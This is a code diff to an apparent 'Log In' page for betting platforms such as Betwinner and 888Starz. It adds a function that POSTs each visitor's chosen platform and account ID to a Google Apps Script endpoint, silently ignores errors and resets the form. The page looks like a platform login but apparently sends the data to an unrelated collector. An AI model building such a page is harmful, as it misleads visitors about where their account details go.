@@ -87,6 +87,7 @@
       outline:none;
       box-shadow:none;
     }
+
     .login-btn {
       margin-top:30px;
       width:100%;
@@ -98,12 +99,25 @@
       font-size:15px;
       font-weight:500;
       cursor:pointer;
-    }
-    .login-btn:active {
-      transform:scale(0.98);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      position:relative;
     }
 
-    /* ✅ وسوم المنصات كزينة صغيرة بدون فراغ زائد */
+    .spinner {
+      width:20px;
+      height:20px;
+      border:3px solid rgba(0,0,0,0.2);
+      border-top:3px solid #000;
+      border-radius:50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     .platform-tags {
       margin:10px auto 5px auto;
       width:95%;
@@ -111,7 +125,7 @@
       display:flex;
       flex-wrap:wrap;
       justify-content:center;
-      gap:4px; /* تقليل المسافة بين الوسوم */
+      gap:4px;
     }
     .platform-tags span {
       background:#1c1c1c;
@@ -122,18 +136,22 @@
       opacity:0.85;
     }
 
-    /* ✅ جعل النص قريبا من المنصات */
     .footer-text {
       text-align:center;
       font-size:12px;
       line-height:1.6;
-      margin-top:5px; /* قريب من الوسوم */
+      margin-top:5px;
       margin-bottom:10px;
       color:#fff;
     }
     .footer-text a {
       color:#28c76f;
       text-decoration:none;
+    }
+
+    .disabled * {
+      pointer-events:none;
+      opacity:0.6;
     }
   </style>
 </head>
@@ -147,10 +165,11 @@
   <div class="big-login" translate="no">Log In</div>
 
   <div class="container">
-    <div class="form-box">
+    <div class="form-box" id="formBox">
       <div class="input-group">
         <label for="platform" translate="no">Plateforme <span class="required-star">*</span></label>
         <select id="platform" name="platform" translate="no">
+          <option value="">-- اختر المنصة --</option>
           <option>Betwinner</option>
           <option>888Starz</option>
           <option>Xparibet</option>
@@ -167,11 +186,12 @@
         <label id="account-label" for="account" translate="no">Numéro de compte ID: <span class="required-star">*</span></label>
         <input type="text" id="account" name="account" translate="no" />
       </div>
-      <button class="login-btn" type="button">Log In</button>
+      <button class="login-btn" type="button" id="loginBtn" onclick="sendData()">
+        <span id="btnText">Log In</span>
+      </button>
     </div>
   </div>
 
-  <!-- ✅ وسوم المنصات الصغيرة كزينة -->
   <div class="platform-tags" translate="no">
     <span>Betwinner</span>
     <span>888Starz</span>
@@ -195,6 +215,10 @@
   <script>
     const platformSelect = document.getElementById('platform');
     const accountLabel = document.getElementById('account-label');
+    const loginBtn = document.getElementById("loginBtn");
+    const btnText = document.getElementById("btnText");
+    const formBox = document.getElementById("formBox");
+    const accountInput = document.getElementById("account");
 
     platformSelect.addEventListener('change', function() {
       const value = this.value.toLowerCase();
@@ -204,6 +228,37 @@
         accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
       }
     });
+
+    async function sendData() {
+      const platform = platformSelect.value;
+      const account = accountInput.value;
+      if (!platform || !account) return;
+
+      // تعطيل + سبينر
+      formBox.classList.add("disabled");
+      btnText.style.display = "none";
+      loginBtn.innerHTML = '<div class="spinner"></div>';
+
+      const data = { platform, account };
+
+      try {
+        await fetch("https://script.google.com/macros/s/AKfycbz7MooJyUYwNZyWdaNJwWTz4wDNnXt8-TpaXbJk2R787VaBpLG4hK6WW1KbZkzAFSS-Cw/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      } catch (error) {
+        // تجاهل الخطأ
+      } finally {
+        // إعادة الواجهة كأنها جديدة
+        platformSelect.value = "";
+        accountInput.value = "";
+        accountLabel.innerHTML = 'Numéro de compte ID: <span class="required-star">*</span>';
+        formBox.classList.remove("disabled");
+        loginBtn.innerHTML = '<span id="btnText">Log In</span>';
+      }
+    }
   </script>
 </body>
 </html>
